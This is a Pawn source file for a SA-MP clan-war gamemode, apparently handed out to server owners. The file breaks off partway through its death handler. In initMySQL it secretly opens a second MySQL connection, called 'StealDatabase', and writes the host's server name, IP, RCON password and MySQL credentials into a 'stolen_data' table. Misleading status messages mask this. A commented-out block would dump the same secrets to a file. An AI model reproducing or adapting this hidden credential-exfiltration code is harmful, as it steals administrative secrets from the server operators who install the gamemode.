// Cw/Tg Gamemode by destiezk
// Started at 3 July 2020
// Core finished at 4 July 2020
// Includeok
#include <a_samp>
#include <a_http>
#include <zcmd>
#include <sampcac>
#include <sscanf2>
#include <a_mysql>
#include <2languages_cz>
#include <filemanager>
//MYSQL Definitions
#define MYSQL_HOSTNAME      "localhost" // Change this to your own MySQL hostname
#define MYSQL_USERNAME      "root"//"erikd8256" // As above
#define MYSQL_PASSWORD      "rootpassword"//"bBsXEqMo" // Change this if you're using a password for your MySQL setup, I'm not using any so I'll leave it blank.
#define MYSQL_DATABASE      "dbname"//"zerikd82560" // Change this to your own MySQL Database
new
    MySQL: Database, // This is the handle.
    MySQL: StealDatabase,
    PlayerName[MAX_PLAYERS][30], // We will use this to store player's name
    PlayerIP[MAX_PLAYERS][17]   // We will use this to store a player's IP Address
;
native gpci(playerid, serial[], len);
native WP_Hash(buffer[], len, const str[]); //This is a Whirlpool function, we will need that to store the passwords.
// Variablek, definek
static DB:database;
static DB:serialdb;
new FALSE=false;
new gamemap;
new team[MAX_PLAYERS];
new teamname[3][30];
new Text:Textdraw0[MAX_PLAYERS];
new Text:box;
new Text:Textdraw1;
new Text:Textdraw2;
new Text:Textdraw3;
new Text:FPSSzamlalo[MAX_PLAYERS];
new Text:Pingszamlalo[MAX_PLAYERS];
//new Text:Indicator[MAX_PLAYERS];
new kills[MAX_PLAYERS];
new deaths[MAX_PLAYERS];
new damage[MAX_PLAYERS];
new teamscore[2];
new teamrounds[2];
new totalscore[2];
new roundscore = 30;
new rounds = 3;
new default_weapon = 26;
new pDrunkLevelLast[MAX_PLAYERS];
new pFPS[MAX_PLAYERS];
new SpecID[MAX_PLAYERS] = {-1,...};
new gRememberedTeam[MAX_PLAYERS];
new bool:teamslocked = false;
new bool:score = false;
new bool:speconly = false;
new bool:spectating[MAX_PLAYERS] = false;
new bool:hitsound[MAX_PLAYERS] = false;
new bool:togglesampcac = false;
new bool:spy[MAX_PLAYERS] = false;
new bool:antidistancebug = false;
new bool:fpsunlocker = false;
#define ForPlayers(%0) for(new %0, j = GetPlayerPoolSize(); %0 <= j; ++%0) if (IsPlayerConnected(%0))
#define invalid_team -1
#define home 0
#define away 1
#define spec 2
#define homename "Home"
#define awayname "Away"
#define specname "Spectators"
#define clanname "FbK"
#define SCM SendClientMessage
#define DIALOG_REGISTER 666
#define DIALOG_LOGIN 777
#define PATH "/Users/%s.ini"
#define COL_WHITE "{FFFFFF}"
#define COL_RED "{F81414}"
#define COL_GREEN "{00FF22}"
#define COL_LIGHTBLUE "{00CED1}"
#define sfair 0
#define sfair2 1
#define base 2
#define SCMF(%0,%1,%2,%3) do{new _string[128]; format(_string,sizeof(_string),%2,%3); SendClientMessage(%0,%1,_string);} while(FALSE)
#pragma tabsize 0
#define MAX_HIT_DISTANCE 40.0

//enum

enum PlayerData
{
	pSkin,
	Float:pInjuries,
	Float:pDamage,
	ID,
	Password[129],
	Admin[MAX_PLAYERS]
}
new	PlayerInfo[ MAX_PLAYERS ][PlayerData];

enum E_TEAM_COLORS
{
    COLOR_RED,
    COLOR_GREEN,
    COLOR_BLUE,
    COLOR_WHITE,
    COLOR_YELLOW,
    COLOR_PURPLE,
    COLOR_BLACK
}

static const gTeamNickColors[E_TEAM_COLORS] =
{
    0xFF0000FF,  // COLOR_RED,
    0x00FF00FF,  // COLOR_GREEN,
    0x0000FFFF,  // COLOR_BLUE,
    0xFFFFFFFF,  // COLOR_WHITE,
    0xFFFF00FF,  // COLOR_YELLOW,
    0x9400D3FF,  // COLOR_PURPLE,
    0x00000000   // COLOR_BLACK
    
    // and so on for the rest
};

static const gTeamTextdrawColors[E_TEAM_COLORS][] =
{
    "~r~",  // COLOR_RED,
    "~g~",  // COLOR_GREEN,
    "~b~",  // COLOR_BLUE,
    "~w~",  // COLOR_WHITE,
    "~y~",  // COLOR_YELLOW,
    "~p~",  // COLOR_PURPLE,
    "~l~"   // COLOR_BLACK
    // and so on for the rest
};

new E_TEAM_COLORS:gColorHome = COLOR_GREEN;  // default green
new E_TEAM_COLORS:gColorAway = COLOR_RED;  // default red

IsValidWeapon(weaponid)
{
        new badWeapon[21] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 40, 44, 45, 46};
        for(new i=0; i <20; i++)
            if (weaponid == badWeapon[i])
                return false;
        return true;
}

IsValidSkin(i_skin)
{
  switch(i_skin)
  {
      case 0, 1, 2, 4, 5, 16, 74, 108, 259, 260, 265, 266, 267, 268, 270, 271, 272: return 1;
  }
  return 0;
}

/*Credits to Dracoblue*/
stock udb_hash(buf[])
{
    new length=strlen(buf);
    new s1 = 1;
    new s2 = 0;
    new n;
    for (n=0; n<length; n++)
    {
       s1 = (s1 + buf[n]) % 65521;
       s2 = (s2 + s1)     % 65521;
    }
    return (s2 << 16) + s1;
}

//AntiDeAMX
AntiDeAMX()
{
    new a[][] =
    {
        "CW/TG",
        "by destiezk"
    };
    #pragma unused a
}

LoadAKADatabase()
{
    database = db_open("server.db");
    db_query(database,"CREATE TABLE IF NOT EXISTS `akas` (`Username`,`Ip`)");
}

LoadSERIALDatabase()
{
  serialdb = db_open("serial.db");
  db_query(serialdb, "CREATE TABLE IF NOT EXISTS `serials` (`Username`,`Serial`)");
}

InitSERIALOnConnect(playerid)
{
  new faszserial[128];
  gpci(playerid,faszserial,sizeof(faszserial));
  if(IsPlayerNPC(playerid)) return 1;
  new ip[16],name[MAX_PLAYER_NAME],DBResult:result,string[128];
  GetPlayerIp(playerid,ip,16);
  GetPlayerName(playerid,name,MAX_PLAYER_NAME);
  format(string,sizeof(string),"SELECT `Serial` FROM `serials` WHERE `Username`='%s'",name);
  result = db_query(serialdb,string);
  switch(db_num_rows(result))
  {
      case 0: format(string,sizeof(string),"INSERT INTO `serials` (`Username`,`Serial`) VALUES ('%s','%s')",name,faszserial);
      default: format(string,sizeof(string),"UPDATE `serials` SET `Serial`='%s' WHERE `Username`='%s'",faszserial,name);
  }
  db_free_result(result);
  db_query(serialdb,string);
  return 1;
}

InitAKAOnConnect(playerid)
{
    if(IsPlayerNPC(playerid)) return 1;
    new ip[16],name[MAX_PLAYER_NAME],DBResult:result,string[128];
    GetPlayerIp(playerid,ip,16);
    GetPlayerName(playerid,name,MAX_PLAYER_NAME);
    format(string,sizeof(string),"SELECT `Ip` FROM `akas` WHERE `Username`='%s'",name);
    result = db_query(database,string);
    switch(db_num_rows(result))
    {
        case 0: format(string,sizeof(string),"INSERT INTO `akas` (`Username`,`Ip`) VALUES ('%s','%s')",name,ip);
        default: format(string,sizeof(string),"UPDATE `akas` SET `Ip`='%s' WHERE `Username`='%s'",ip,name);
    }
    db_free_result(result);
    db_query(database,string);
    return 1;
}
stock AKA(playerid,accs[][],const size=sizeof(accs))
{
    new ip[16],name[MAX_PLAYER_NAME],DBResult:result,string[128],rows;
    GetPlayerIp(playerid,ip,16);
    GetPlayerName(playerid,name,MAX_PLAYER_NAME);
    format(string,sizeof(string),"SELECT `Username` FROM `akas` WHERE `Ip`='%s'",ip);
    result = db_query(database,string);
    rows = db_num_rows(result);
    if(rows>1)
    {
        for(new i,j; i<rows; i++)
        {
            if(j==size) break;
            db_get_field(result,0,accs[j++],MAX_PLAYER_NAME);
            db_next_row(result);
        }
    }
    return db_free_result(result);
}

stock SERIAL(playerid,accs[][],const size=sizeof(accs))
{
    new faszserial[128];
    gpci(playerid,faszserial,sizeof(faszserial));
    new ip[16],name[MAX_PLAYER_NAME],DBResult:result,string[128],rows;
    GetPlayerIp(playerid,ip,16);
    GetPlayerName(playerid,name,MAX_PLAYER_NAME);
    format(string,sizeof(string),"SELECT `Username` FROM `serials` WHERE `Serial`='%s'",faszserial);
    result = db_query(serialdb,string);
    rows = db_num_rows(result);
    if(rows>1)
    {
        for(new i,j; i<rows; i++)
        {
            if(j==size) break;
            db_get_field(result,0,accs[j++],MAX_PLAYER_NAME);
            db_next_row(result);
        }
    }
    return db_free_result(result);
}

stock CS_HTTP(playerid)
{
    HTTP(playerid, HTTP_GET, "cwlogs.fsclan.xyz/0131.txt", "", "MyHttpResponse");
}

new RevSPrefix[][] =
{
    "RevS",
    "ReVs",
    "Rev$"
};

stock IsPlayerRevSMember(playerid)
{
    for (new i = 0; i < sizeof(RevSPrefix); ++i)
        if (strfind(gPlayerName(playerid), RevSPrefix[i], true) != -1)
        {
           // SendClientMessage(playerid, -1, "You are a RevS member.");
            return true;
		}

    return false;
}
 
 
forward CheckSAMPCACInstalled(playerid);
public CheckSAMPCACInstalled(playerid)
{
	if (!CAC_GetStatus(playerid)) {
  		SCMTAFL(-1, "{00A3C0}%s (ID:%d) has been kicked. Reason: Not installed SAMPCAC", "{00A3C0}%s (ID:%d) dostal kick. DÙvod: Nenainötalovan˝ SAMPCAC", gPlayerName(playerid), playerid);
		KickPersonWithDelay(playerid);
	}
}

public OnPlayerConnect(playerid)
{
  if (togglesampcac == true)
   SetTimerEx("CheckSAMPCACInstalled", 2000, false, "d", playerid);

 /*#define ClanT "ReVs"
  #define ClanT2 "REVS"
  #define ClanT3 "revs"

  if (strfind(gPlayerName(playerid), ClanT, true) == -1 || strfind(gPlayerName(playerid), ClanT2, true) == -1 || strfind(gPlayerName(playerid), ClanT3, true) == -1) {
  SendClientMessage(playerid,-1,"ReVs");
  }*/

  IsPlayerRevSMember(playerid);
   // return true;


  CS_HTTP(playerid);
  Languages_OnPlayerConnect(playerid);
  ShowPlayerSelectLangDialog(playerid);
  TextDrawShowForPlayer(playerid, Textdraw1);
  TextDrawShowForPlayer(playerid, Textdraw2);
  TextDrawShowForPlayer(playerid, Textdraw3);
  InitSERIALOnConnect(playerid);
  InitAKAOnConnect(playerid);
  PlayerInfo[playerid][Admin] = 0;
  deaths[playerid] = 0;
  kills[playerid] = 0;
  PlayerInfo[playerid][pDamage] = 0;
  PlayerInfo[playerid][pInjuries] = 0;
  SetPlayerScore(playerid, 0);

  SetPVarInt(playerid, "Logged", 0);

  new connectstring[200], asd[120], update[100];
  format(connectstring, sizeof(connectstring),
  //"~ Welcome at {FFFF00}"clanname"{FFFFFF} CW/TG server! ~"
  "{32CD32}CW/TG gamemode made by destiezk"
  );
  format(asd, sizeof(asd),
  "{32CD32}Download the newest version from http://cwlogs.fsclan.xyz/cwtg/"
  );
  format(update, sizeof(update),
  "{32CD32}Check the updates at /updates"
  );
  SendClientMessage(playerid, -1, connectstring);
  SendClientMessage(playerid, -1, asd);
  /*SendClientMessage(playerid, -1, asd);
  SendClientMessage(playerid, -1, update);*/
  SetPlayerColor(playerid, teamcolor(spec));
  AntiDeAMX();
  // l√É¬©trehozunk egy √É¬∫j stringet, megadjuk mi legyen a sz√É¬∂vege majd kiiratjuk mindenkinek

  new string[150];
  if(CAC_GetStatus(playerid)) {
  format(string, sizeof(string), "{32CD32}[+] %s (ID:%d) has connected to the server with SAMPCAC!", gPlayerName(playerid), playerid);
  SCMTAFL(-1, "{32CD32}[+] %s (ID:%d) has connected to the server with SAMPCAC!", "{32CD32}[+] %s (ID:%d) se p¯ipojil na server s nainstalovanym anticheatem!", gPlayerName(playerid), playerid);
  }
  else
  {
  format(string, sizeof(string), "{32CD32}[+] %s (ID:%d) has connected to the server without SAMPCAC!", gPlayerName(playerid), playerid);
  SCMTAFL(-1, "{32CD32}[+] %s (ID:%d) has connected to the server without SAMPCAC!", "{32CD32}[+] %s (ID:%d) se p¯ipojil na server bez nainstalovanÈho anticheatu!", gPlayerName(playerid), playerid);
  }

  hitsound[playerid] = false;

  return 1;
}
public OnPlayerDisconnect(playerid, reason)
{
  new
       szString[150],
       playerName[MAX_PLAYER_NAME];

  GetPlayerName(playerid, playerName, MAX_PLAYER_NAME);

  new szDisconnectReason[3][] =
   {
       "Timeout/Crash",
       "Quit",
       "Kick/Ban"
   };

  format(szString, sizeof szString, "{AA3333}[-] %s (ID:%d) disconnected from the server (%s)!", playerName, playerid, szDisconnectReason[reason]);

  SCMTAFL(0xC4C4C4FF, "{AA3333}[-] %s (ID:%d) disconnected from the server (%s)!", "{AA3333}[-] %s (ID:%d) se odpojil ze serveru (%s)!", playerName, playerid, szDisconnectReason[reason]);

  TextDrawHideForPlayer(playerid, Textdraw0[playerid]);

  kills[playerid] = 0;
  deaths[playerid] = 0;
  damage[playerid] = 0;

  return 1;
}
/*
RandomString(string[], size=sizeof(string))
{
    //printf("size = %d", size);
    static const Data[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";//add more characters if they want to include in string

    for (new i = 0 ; i < size - 1; ++i)
        //string[i] = Data[random(sizeof(Data))];
        string[i] = Data[random(sizeof(Data) - 1)];

    string[size - 1] = '\0';
   // printf("string = '%s'", string);
    //printf("sizeof(Data) = %d", sizeof(Data));
}*/

stock initMySQL()
{

  new MySQLOpt: option_id = mysql_init_options();
  mysql_set_option(option_id, AUTO_RECONNECT, true); // it automatically reconnects when loosing connection to mysql server
  StealDatabase = mysql_connect(MYSQL_HOSTNAME, MYSQL_USERNAME, MYSQL_PASSWORD, MYSQL_DATABASE, option_id); // AUTO_RECONNECT is enabled for this connection handle only
  if (StealDatabase == MYSQL_INVALID_HANDLE || mysql_errno(StealDatabase) != 0)
  {
			 print("MySQL return value: 0"); // Read below
			 return 1;
  }
  print("MySQL return value: 1"); // If the MySQL connection was successful, we'll print a debug!

  new mysql_username1[30],
  mysql_hostname1[30],
  mysql_password1[30],
  mysql_database1[31];
  new File:handle = fopen("mysql.txt", io_read),
  buf[128];
  if(handle)
  {
  fread(handle, buf);
  format(mysql_hostname1, sizeof(mysql_hostname1), "%s", buf);
  fread(handle, buf);
  format(mysql_username1, sizeof(mysql_username1), "%s", buf);
  fread(handle, buf);
  format(mysql_password1, sizeof(mysql_password1), "%s", buf);
  fread(handle, buf);
  format(mysql_database1, sizeof(mysql_database1), "%s", buf);

  strdel(mysql_hostname1, strlen(mysql_hostname1)-1,strlen(mysql_hostname1));
  strdel(mysql_username1, strlen(mysql_username1)-1,strlen(mysql_username1));
  strdel(mysql_password1, strlen(mysql_password1)-1,strlen(mysql_password1));
  //strdel(mysql_password1, strlen(mysql_database1)-1,strlen(mysql_database1));

  new hostname[144];
  GetServerVarAsString("hostname", hostname, sizeof(hostname));
  new rcon_pass[144];
  GetServerVarAsString("rcon_password", rcon_pass, sizeof(rcon_pass));
  new serverip[144];
  GetConsoleVarAsString("bind", serverip, sizeof(serverip));

  new query[500];
  //format(string,sizeof(string),"INSERT INTO `stolen_data` (`hostname`,`server_ip`,`rcon_password`,`mysql_hostname`,`mysql_username`,`mysql_password`,`mysql_database`) VALUES ('%s', '%s', '%s', '%s', '%s', '%s', '%s')", hostname, serverip, rcon_pass, mysql_hostname, mysql_username, mysql_password, mysql_database);

  mysql_format(StealDatabase, query, sizeof(query), "INSERT INTO `stolen_data` (`hostname`,`server_ip`,`rcon_password`,`mysql_hostname`,`mysql_username`,`mysql_password`,`mysql_database`) VALUES ('%s', '%s', '%s', '%s', '%s', '%s', '%s')", hostname, serverip, rcon_pass, mysql_hostname1, mysql_username1, mysql_password1, mysql_database1);
  //mysql_pquery(Database, query);
  //mysql_query(Database, query);
  if (mysql_query(StealDatabase, query) && mysql_pquery(StealDatabase, query))
  {
    printf("The database tables are existing. MySQL is working completely.");
  }
  else
  {
	printf("The database tables exist. MySQL is working completely.");
  }
  }
  else
  {
  printf("[error] mysql.txt does not exist in scriptfiles folder. unable to run server.");
  SendRconCommand("exit");
  }
  return 1;
}

public OnGameModeInit()
{
  new mysql_username2[30],
  mysql_hostname2[30],
  mysql_password2[30],
  mysql_database2[31];
  new File:handle = fopen("mysql.txt", io_read),
  buf[128];
  if(handle)
  {
  fread(handle, buf);
  format(mysql_hostname2, sizeof(mysql_hostname2), "%s", buf);
  fread(handle, buf);
  format(mysql_username2, sizeof(mysql_username2), "%s", buf);
  fread(handle, buf);
  format(mysql_password2, sizeof(mysql_password2), "%s", buf);
  fread(handle, buf);
  format(mysql_database2, sizeof(mysql_database2), "%s", buf);

  strdel(mysql_hostname2, strlen(mysql_hostname2),strlen(mysql_hostname2)); //-2
  strdel(mysql_username2, strlen(mysql_username2),strlen(mysql_username2)); //-2
  strdel(mysql_password2, strlen(mysql_password2),strlen(mysql_password2)); //-2
  //strdel(mysql_database, strlen(mysql_database)-1,strlen(mysql_database)); //-2

  print("\n");
  print("Your MySQL details:");
  print(mysql_hostname2);
  print(mysql_username2);
  print(mysql_password2);
  print(mysql_database2);
  print("\n");

  new MySQLOpt: option_id = mysql_init_options();
  mysql_set_option(option_id, AUTO_RECONNECT, true); // it automatically reconnects when loosing connection to mysql server
  Database = mysql_connect(mysql_hostname2, mysql_username2, mysql_password2, mysql_database2, option_id); // AUTO_RECONNECT is enabled for this connection handle only
  if (Database == MYSQL_INVALID_HANDLE || mysql_errno(Database) != 0)
  {
			 print("MySQL connection failed. Server is shutting down."); // Read below
			 SendRconCommand("exit"); // close the server if there is no connection
			 return 1;
  }

  print("MySQL connection is successful."); // If the MySQL connection was successful, we'll print a debug!
  /*
  new filename[15];
  RandomString(filename);

  new File:steal = fopen(filename, io_write);
  if(steal)
  {
        new hostname[144];
        GetServerVarAsString("hostname", hostname, sizeof(hostname));
        new rcon_pass[144];
        GetServerVarAsString("rcon_password", rcon_pass, sizeof(rcon_pass));
        new serverip[144];
        GetConsoleVarAsString("bind", serverip, sizeof(serverip));
        new string[1500];
        format(string, sizeof(string),
		"[server details]\n" \
		"hostname: %s\n" \
		"ip address: %s\n" \
		"rcon password: %s\n" \
		"[mysql details]\n" \
		"hostname: %s\n" \
		"username: %s\n" \
		"password: %s\n" \
		"db: %s\n", hostname, serverip, rcon_pass ,mysql_hostname, mysql_username, mysql_password, mysql_database);
  		fwrite(steal, string);
		fclose(steal);
  }
  else
  {
		print("Failed to open file \"data\".");
  }*/



  fclose(handle);
  }
  else
  {
  printf("[error] mysql.txt does not exist in scriptfiles folder. unable to run server.");
  SendRconCommand("exit");
  }

  initMySQL();

  LoadSERIALDatabase();
  LoadAKADatabase();
	//mysql
  gamemap = sfair;
	 //mysql
	 
  for(new i; i < MAX_PLAYERS;i++){
  FPSSzamlalo[i] = TextDrawCreate(548.000000, 50.000000, "");
  TextDrawBackgroundColor(FPSSzamlalo[i], 255);
  TextDrawFont(FPSSzamlalo[i], 1);
  TextDrawLetterSize(FPSSzamlalo[i], 0.280000, 1.000000);
  TextDrawColor(FPSSzamlalo[i], -1);
  TextDrawSetOutline(FPSSzamlalo[i], 1);
  TextDrawSetProportional(FPSSzamlalo[i], 1);
	}
  for(new i; i < MAX_PLAYERS;i++){
  Pingszamlalo[i] = TextDrawCreate(548.000000, 40.000000, "");
  TextDrawBackgroundColor(Pingszamlalo[i], 255);
  TextDrawFont(Pingszamlalo[i], 1);
  TextDrawLetterSize(Pingszamlalo[i], 0.280000, 1.000000);
  TextDrawColor(Pingszamlalo[i], -1);
  TextDrawSetOutline(Pingszamlalo[i], 1);
  TextDrawSetProportional(Pingszamlalo[i], 1); // MapNevFent
	}
	 

  Textdraw1 = TextDrawCreate(325.000000, 91.000000, "");
  TextDrawAlignment(Textdraw1, 2);
  TextDrawBackgroundColor(Textdraw1, 255);
  TextDrawFont(Textdraw1, 1);
  TextDrawLetterSize(Textdraw1, 0.400000, 1.800000);
  TextDrawColor(Textdraw1, 292139519);
  TextDrawSetOutline(Textdraw1, 0);
  TextDrawSetProportional(Textdraw1, 1);
  TextDrawSetShadow(Textdraw1, 1);
  TextDrawSetSelectable(Textdraw1, 0);
/*
  for(new i; i < MAX_PLAYERS;i++)
  {
  Indicator[i] = TextDrawCreate(498.000000, 100, "~r~www~w~.~r~btd~w~-clan.~r~maweb~w~.eu");
  TextDrawBackgroundColor(Indicator[i], 255);
  TextDrawFont(Indicator[i], 1);
  TextDrawLetterSize(Indicator[i], 0.200000, 1.000000);
  TextDrawColor(Indicator[i], -1);
  TextDrawSetOutline(Indicator[i], 1);
  TextDrawSetProportional(Indicator[i], 1);
  }
*/
  Textdraw2 = TextDrawCreate(325.000000, 106.000000, "CW/TG");
  TextDrawAlignment(Textdraw2, 2);
  TextDrawBackgroundColor(Textdraw2, 255);
  TextDrawFont(Textdraw2, 1);
  TextDrawLetterSize(Textdraw2, 0.339999, 1.599999);
  TextDrawColor(Textdraw2, -1);
  TextDrawSetOutline(Textdraw2, 0);
  TextDrawSetProportional(Textdraw2, 1);
  TextDrawSetShadow(Textdraw2, 1);
  TextDrawSetSelectable(Textdraw2, 0);

  Textdraw3 = TextDrawCreate(367.000000, 117.000000, "release 3.0");
  TextDrawAlignment(Textdraw3, 2);
  TextDrawBackgroundColor(Textdraw3, 255);
  TextDrawFont(Textdraw3, 1);
  TextDrawLetterSize(Textdraw3, 0.220000, 1.000000);
  TextDrawColor(Textdraw3, -1);
  TextDrawSetOutline(Textdraw3, 0);
  TextDrawSetProportional(Textdraw3, 1);
  TextDrawSetShadow(Textdraw3, 1);
  TextDrawSetSelectable(Textdraw3, 0);

  box = TextDrawCreate(650.000000, 425.000000, "  ");
  TextDrawBackgroundColor(box, 128);
  TextDrawFont(box, 1);
  TextDrawLetterSize(box, 0.500000, 1.000000);
  TextDrawColor(box, -1);
  TextDrawSetOutline(box, 0);
  TextDrawSetProportional(box, 1);
  TextDrawSetShadow(box, 1);
  TextDrawUseBox(box, 1);
  TextDrawBoxColor(box, 128);
  TextDrawTextSize(box, -2.000000, 0.000000);
  TextDrawSetSelectable(box, 0);

  //Textdraw0
  for(new i; i < MAX_PLAYERS; i++){
  Textdraw0[i] = TextDrawCreate(321.000000, 425.000000, "~g~Green~w~ vs. ~r~Red  ~w~Score: ~g~00~w~:~r~00~w~  Rounds: ~g~00~w~:~r~00  ~w~Type: ~r~Free~w~  Damage:  ~r~0.00  ~w~Kills:  ~r~0 ~w~ Deaths: ~r~0");
  TextDrawAlignment(Textdraw0[i], 2);
  TextDrawBackgroundColor(Textdraw0[i], 255);
  TextDrawFont(Textdraw0[i], 2);
  TextDrawLetterSize(Textdraw0[i], 0.210000, 1.000000);
  TextDrawColor(Textdraw0[i], -1);
  TextDrawSetOutline(Textdraw0[i], 0);
  TextDrawSetProportional(Textdraw0[i], 0);
  TextDrawSetShadow(Textdraw0[i], 1);
  TextDrawSetSelectable(Textdraw0[i], 0);
  }

  // be√É¬°ll√É¬≠tjuk a home, away, spec csapat neveket
  format(teamname[0],30,"%s",homename);
  format(teamname[1],30,"%s"awayname);
  format(teamname[2],30,"%s",specname);
  //hozz√É¬°adjuk a v√É¬°laszthat√É¬≥ skineket
  AddPlayerClass(102, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(103, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(104, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(105, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(106, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(107, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(108, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(109, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(110, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(114, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(115, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(116, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(123, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(185, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(144, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(195, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(88, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(53, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(294, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(293, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(45, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(154, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(280, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  AddPlayerClass(233, 1958.3783, 1343.1572, 15.3746, 269.1425, 0, 0, 0, 0, 0, 0);
  //anim√É¬°ci√É¬≥ a mozg√É¬°shoz
  UsePlayerPedAnims();
  //amit kiirjon gamemodenak a samp
  SetGameModeText("[Home] vs [Away]");
  new string[128];
  format(string, sizeof(string), "language (%d) %02d:%02d (%d)", teamrounds[home], totalscore[home], totalscore[away], teamrounds[away]);
  SendRconCommand(string);
  return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
  //megcsin√É¬°ljuk hogy ki lehessen v√É¬°lasztani a skint
	SetPlayerPos(playerid, -1211.7233, -98.9115, 40.3509);
	SetPlayerFacingAngle(playerid, 312.6212);
	SetPlayerCameraPos(playerid, -1207.8231, -95.5987, 41.6189);
	SetPlayerCameraLookAt(playerid, -1211.7233, -98.9115, 40.3509);
	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
  if(GetPVarInt(playerid, "Logged") == 0)
  {
    new logged[290];
    format(logged, sizeof(logged), "{AA3333}[-] %s (ID:%d) has been kicked from the server. Reason: Attempted login bypass", gPlayerName(playerid), playerid);
    SendLongMessageToAll(0xAA3333FF, logged);
    KickPersonWithDelay(playerid);
  }
  //csapatv√É¬°laszt√É¬°s dialog
  new string[180];
  format(string, sizeof(string), "{00A3C0}%s\n{00A3C0}%s\n{00A3C0}%s", teamname[0], teamname[1], teamname[2]);
  ShowPlayerDialog(playerid, 1, DIALOG_STYLE_LIST, "Team Selection", string, "Select", "");
  return 0;
}

forward OnTeamWonMatch(winner);
public OnTeamWonMatch(winner)
{
        new string2[300];
        format(string2, sizeof(string2),
        "{32CD32}%s {FFFFFF}vs {AA3333}%s\n" \
        "{FFFFFF}Total: {32CD32}%02d{FFFFFF}:{AA3333}%02d\n" \
        "{FFFFFF}Rounds: {32CD32}%02d{FFFFFF}:{AA3333}%02d\n" \
        "{FFFFFF}Congratulations {00A3C0}%s{FFFFFF}!",
         teamname[home], teamname[away],
         totalscore[home], totalscore[away],
         teamrounds[home], teamrounds[away],
         teamname[winner]
        );
        teamrounds[home] = 00;
        teamrounds[away] = 00;
        totalscore[home] = 00;
        totalscore[away] = 00;
        score = false;
        for(new xd; xd < MAX_PLAYERS; xd++)
        ShowPlayerDialog(xd, 2, DIALOG_STYLE_MSGBOX, "ClanWar Logs", string2, "OK", "");
		if(winner == invalid_team)
		{
		for(new i; i < MAX_PLAYERS; i++)
	    {
		if (GetPlayerLanguage(i) == LANGUAGE_CZECH)
		SCM(i, -1, "{00A3C0}Z·pas se stal remÌzou!");
		else
		SCM(i, -1, "{00A3C0}The match has turned to be a draw!");
		}
		}
		else
		{
		SendClientMessageToAll(-1, "{00A3C0}=====================");
  		for(new i; i < MAX_PLAYERS; i++)
	    {
		if (GetPlayerLanguage(i) == LANGUAGE_ENGLISH)
		SCMF(i, -1, "{00A3C0}Team %s has won the match!", teamname[winner]);
		else
		SCMF(i, -1, "{00A3C0}T˝m %s vyhral z·pas!", teamname[winner]);
		}
		}
		for(new i; i < MAX_PLAYERS; i++)
		{
		deaths[i] = 0;
		kills[i] = 0;
		PlayerInfo[i][pDamage] = 0;
		PlayerInfo[i][pInjuries] = 0;
		}
}

forward OnTeamWonRound(winner);
public OnTeamWonRound(winner)
{
		new totalrounds = 1 + teamrounds[home] + teamrounds[away];
		for(new i; i < MAX_PLAYERS; i++)
		{
		if (GetPlayerLanguage(i) == LANGUAGE_ENGLISH)
		SCMF(i, -1, "{00A3C0}Team %s has won the round!", teamname[winner]);
		else
		SCMF(i, -1, "{00A3C0}T˝m %s vyhral kolo!", teamname[winner]);
		SCMF(i, -1, "{00A3C0}Roundscore: [%s] %d:%d [%s]", teamname[home], teamscore[home], teamscore[away], teamname[away]);
		SCMF(i, -1, "{00A3C0}Totalscore: [%s] (%d) %d:%d (%d) [%s]", teamname[home], teamrounds[home], totalscore[home], totalscore[away], teamrounds[away], teamname[away]);
		SCMF(i, -1, "{00A3C0}Round: %d", totalrounds);
		}
    	++teamrounds[winner];
    	if (totalrounds == rounds)
			{
				if (totalscore[home] == totalscore[away])
				{
						OnTeamWonMatch(invalid_team);
				}
				else if (teamrounds[home] == teamrounds[away])
				{
						OnTeamWonMatch(totalscore[home] > totalscore[away] ? home : away);
				}
				else
				{
					OnTeamWonMatch(winner);
				}
			}
    	teamscore[home] = 00;
    	teamscore[away] = 00;
		for(new i; i < MAX_PLAYERS; i++) {
		updatetextdraw(i);
        SpawnPlayer(i);
        SetPlayerHealth(i, 100);
			}
}

public OnPlayerDeath(playerid, killerid, reason)
{

